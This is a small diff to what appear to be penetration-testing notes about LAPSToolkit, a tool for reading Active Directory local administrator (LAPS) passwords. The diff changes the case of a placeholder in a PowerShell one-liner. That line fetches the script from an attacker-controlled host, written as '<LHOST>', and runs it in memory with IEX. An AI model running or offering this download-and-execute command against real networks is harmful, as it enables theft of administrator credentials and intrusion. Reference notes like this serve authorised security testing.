@@ -8,7 +8,7 @@
 https://github.com/leoloobeek/LAPSToolkit
 
 ```powershell
-(new-object system.net.webclient).downloadstring('http://<lhost>/LAPSToolkit.ps1') | IEX; Import-Module .\LAPSToolkit.ps1
+(new-object system.net.webclient).downloadstring('http://<LHOST>/LAPSToolkit.ps1') | IEX; Import-Module .\LAPSToolkit.ps1
 ```
 
 ## laps toolkit - Get laps computer
